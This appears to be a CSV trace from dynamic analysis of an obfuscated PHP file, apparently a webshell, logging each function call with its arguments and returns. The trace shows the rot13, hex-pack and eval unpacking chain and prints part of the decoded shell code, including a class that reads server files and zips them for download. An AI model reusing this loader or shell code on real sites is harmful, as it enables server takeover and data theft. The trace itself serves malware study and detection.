uuid,file_md5,index,source,target,argc,argv,return,dynamic
2712d45acf6c464c1cbd44580d8719cc,29e8b9f17accb14f74c87f9fa601ee98,0,__main__,zend_compile_file,2,"{""value"": []}","{""value"": ""2826413C413C413C00003C3E""}",[]
2712d45acf6c464c1cbd44580d8719cc,29e8b9f17accb14f74c87f9fa601ee98,1,__main__,error_reporting,1,"{""value"": [[0, ""new_error_level"", 1]]}","{""value"": ""void""}",[0]
2712d45acf6c464c1cbd44580d8719cc,29e8b9f17accb14f74c87f9fa601ee98,2,__main__,header,1,"{""value"": [[0, ""header"", ""content-Type: text/html; charset=gb2312""]]}","{""value"": ""void""}",[0]
2712d45acf6c464c1cbd44580d8719cc,29e8b9f17accb14f74c87f9fa601ee98,3,__main__,set_time_limit,1,"{""value"": [[0, ""seconds"", 0]]}","{""value"": ""void""}",[0]
2712d45acf6c464c1cbd44580d8719cc,29e8b9f17accb14f74c87f9fa601ee98,4,__main__,sa,0,"{""value"": []}","{""value"": null}",[]
2712d45acf6c464c1cbd44580d8719cc,29e8b9f17accb14f74c87f9fa601ee98,5,sa,str_rot13,1,"{""value"": [[0, ""str"", ""66756r6374696s6r20526s6s745s475028246172726179290q0n7o0q0n097768696p65286p69737428246o65792p2476617229203q206561636828246172726179""]]}","{""value"": ""66756e6374696f6e20526f6f745f475028246172726179290d0a7b0d0a097768696c65286c69737428246b65792c2476617229203d206561636828246172726179""}",[0]
2712d45acf6c464c1cbd44580d8719cc,29e8b9f17accb14f74c87f9fa601ee98,6,sa,ss,1,"{""value"": [[0, ""s"", ""66756e6374696f6e20526f6f745f475028246172726179290d0a7b0d0a097768696c65286c69737428246b65792c2476617229203d206561636828246172726179""]]}","{""value"": null}",[0]
2712d45acf6c464c1cbd44580d8719cc,29e8b9f17accb14f74c87f9fa601ee98,7,ss,pack,2,"{""value"": [[0, ""format"", ""H*""], [1, ""args"", ""66756e6374696f6e20526f6f745f475028246172726179290d0a7b0d0a097768696c65286c69737428246b65792c2476617229203d206561636828246172726179""]]}","{""value"": ""function Root_GP($array)\r\n{\r\n\twhile(list($key,$var) = each($array))\r\n\t{\r\n\t\tif((strtoupper($key) != $key || ''.intval($key) == \""$ke""}","[0, 0]"
2712d45acf6c464c1cbd44580d8719cc,29e8b9f17accb14f74c87f9fa601ee98,8,ss,eval,1,"{""value"": [[0, ""phpcode"", ""function Root_GP($array)\r\n{\r\n\twhile(list($key,$var) = each($array))\r\n\t{\r\n\t\tif((strtoupper($key) != $key || ''.intval($key) == \""$ke""]]}","{""value"": null}",[0]
2712d45acf6c464c1cbd44580d8719cc,29e8b9f17accb14f74c87f9fa601ee98,9,eval,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function Root_GP($array)\r\n{\r\n\twhile(list($key,$var) = each($array))\r\n\t{\r\n\t\tif((strtoupper($key) != $key || ''.intval($key) == \""$key\"") && $key != 'argc' && $key != 'argv')\r\n\t\t{\r\n\t\t\tif(is_string($var)) $array[$key] = stripslashes($var);\r\n\t\t\tif(is_array($var)) $array[$key] = Root_GP($var);  \r\n\t\t}\r\n\t}\r\n\treturn $array;\r\n}\r\n\r\nfunction Root_CSS()\r\n{\r\nprint<<<END\r\n<style type=\""text/css\"">\r\n\t*{padding:0; margin:0;}\r\n\tbody{background:threedface;font-family:\""Verdana\"", \""Tahoma\"", \""\\xcb\\xce\\xcc\\xe5\"",sans-serif; font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}\r\n\ta{color:#000000;text-decoration:none;}\r\n\ta:hover{background:#BBBBBB;}\r\n\ttable{color:#000000;font-family:\""Verdana\"", \""Tahoma\"", \""\\xcb\\xce\\xcc\\xe5\"",sans-serif;font-size:13px;border:1px solid #999999;}\r\n\ttd{background:#F9F6F4;}\r\n\t.toptd{background:threedface; width:310px; border-color:#FFFFFF #999999 #999999 #FFFFFF; border-style:solid;border-width:1px;}\r\n\t.msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}\r\n\t.actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}\r\n</style>\\n\r\nEND;\r\nreturn false;\r\n}\r\n\r\n//\\xce\\xc4\\xbc\\xfe\\xb9\\xdc\\xc0\\xed\r\nclass packdir\r\n{\r\n\tvar $out = '';\r\n\tvar $datasec      = array();\r\n\tvar $ctrl_dir     = array();\r\n\tvar $eof_ctrl_dir = \""\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\"";\r\n\tvar $old_offset   = 0;\r\n\tfunction packdir($array)\r\n\t{\r\n\t\tif(@function_exists('gzcompress'))\r\n\t\t{\r\n\t\t\tfor($n = 0;$n < count($array);$n++)\r\n\t\t\t{\r\n\t\t\t\t$array[$n] = urldecode($array[$n]);\r\n\t\t\t\t$fp = @fopen($array[$n], 'r');\r\n\t\t\t\t$filecode = @fread($fp, @filesize($array[$n]));\r\n\t\t\t\t@fclose($fp);\r\n\t\t\t\t$this -> filezip($filecode,basename($array[$n]));\r\n\t\t\t}\r\n\t\t\t@closedir($zhizhen);\r\n\t\t\t$this->out = $this->packfile();\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\treturn false;\r\n\t}\r\n\tfunction at($atunix = 0)\r\n\t{\r\n\t\t$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);\r\n\t\tif ($unixarr['year'] < 1980)\r\n\t\t{\r\n\t\t\t$unixarr['year']    = 1980;\r\n\t\t\t$unixarr['mon']     = 1;\r\n\t\t\t$unixarr['mday']    = 1;\r\n\t\t\t$unixarr['hours']   = 0;\r\n\t\t\t$unixarr['minutes'] = 0;\r\n\t\t\t$unixarr['seconds'] = 0;\r\n\t\t} \r\n\t\treturn (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) | ($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);\r\n\t}\r\n\tfunction filezip($data, $name, $time = 0)\r\n\t{\r\n\t\t$name = str_replace('\\\\', '/', $name);\r\n\t\t$dtime = dechex($this->at($time));\r\n\t\t$hexdtime\t= '\\x'.$dtime[6].$dtime[7].'\\x'.$dtime[4].$dtime[5].'\\x'.$dtime[2].$dtime[3].'\\x'.$dtime[0].$dtime[1];\r\n\t\teval('$hexdtime = \""' . $hexdtime . '\"";');\r\n\t\t$fr\t= \""\\x50\\x4b\\x03\\x04\"";\r\n\t\t$fr\t.= \""\\x14\\x00\"";\r\n\t\t$fr\t.= \""\\x00\\x00\"";\r\n\t\t$fr\t.= \""\\x08\\x00\"";\r\n\t\t$fr\t.= $hexdtime;\r\n\t\t$unc_len = strlen($data);\r\n\t\t$crc = crc32($data);\r\n\t\t$zdata = gzcompress($data);\r\n\t\t$c_len = strlen($zdata);\r\n\t\t$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);\r\n\t\t$fr .= pack('V', $crc);\r\n\t\t$fr .= pack('V', $c_len);\r\n\t\t$fr .= pack('V', $unc_len);\r\n\t\t$fr .= pack('v', strlen($name));\r\n\t\t$fr .= pack('v', 0);\r\n\t\t$fr .= $name;\r\n\t\t$fr .= $zdata;\r\n\t\t$fr .= pack('V', $crc);\r\n\t\t$fr .= pack('V', $c_len);\r\n\t\t$fr .= pack('V', $unc_len);\r\n\t\t$this -> datasec[] = $fr;\r\n\t\t$new_offset = strlen(implode('', $this->datasec));\r\n\t\t$cdrec = \""\\x50\\x4b\\x01\\x02\"";\r\n\t\t$cdrec .= \""\\x00\\x00\"";\r\n\t\t$cdrec .= \""\\x14\\x00\"";\r\n\t\t$cdrec .= \""\\x00\\x00\"";\r\n\t\t$cdrec .= \""\\x08\\x00\"";\r\n\t\t$cdrec .= $hexdtime;\r\n\t\t$cdrec .= pack('V', $crc);\r\n\t\t$cdrec .= pack('V', $c_len);\r\n\t\t$cdrec .= pack('V', $unc_len);\r\n\t\t$cdrec .= pack('v', strlen($name) );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('V', 32 );\r\n\t\t$cdrec .= pack('V', $this -> old_offset );\r\n\t\t$this -> old_offset = $new_offset;\r\n\t\t$cdrec .= $name;\r\n\t\t$this -> ctrl_dir[] = $cdrec;\r\n\t}\r\n\tfunction packfile()\r\n\t{\r\n\t\t$data    = implode('', $this -> datasec);\r\n\t\t$ctrldir = implode('', $this -> ctrl_dir);\r\n\t\treturn $data.$ctrldir.$this -> eof_ctrl_dir.pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).pa""]]}","{""value"": ""00000000000000000000000000000000000000000000000000000000000000000000000000000000000000003C2B50423C532650423C53262A5051112B41413C4F2A5051423C122B3C2659732B423C263C030126415051423C6A423C2A423C3C4F2A59732B505126122E12342B3C2A2A2659732B50519D2A413C6A3C9D26302B423C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B5051425051423C322A302B423C322A302B3C322A2A3C322A2A3E""}",[0]
